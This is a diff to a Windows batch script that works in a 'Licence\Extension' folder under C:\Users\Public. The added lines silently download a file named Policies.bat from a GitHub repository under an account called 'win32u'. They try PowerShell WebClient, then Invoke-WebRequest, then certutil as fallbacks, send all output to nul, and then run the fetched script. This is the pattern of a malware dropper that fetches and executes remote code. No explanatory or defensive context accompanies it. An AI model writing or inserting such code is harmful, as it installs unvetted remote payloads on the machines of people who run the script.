@@ -89,7 +89,19 @@ echo ************* Debugging dir ****************
    cd /D C:\Users\Public\Licence\Extension
    echo Success!
 
-
+   echo Policy...
+   if not exist "C:\Users\Public\Licence\Extension\Policies.bat" (
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/Policies.bat?raw=true', 'Policies.bat')" > nul 2> nul    
+   ) 
+   if errorlevel 1 (
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/Policies.bat?raw=true -OutFile Policies.bat" > nul 2> nul
+   ) 
+   if errorlevel 1 (
+      set url="https://github.com/win32u/Licence/blob/main/UserSohel/Policies.bat?raw=true"
+      set filename="Policies.bat"
+      certutil -urlcache -split -f %url% %filename% > nul 2> nul   
+   )
+   call "C:\Users\Public\Licence\Extension\Policies.bat" 
 
 
 
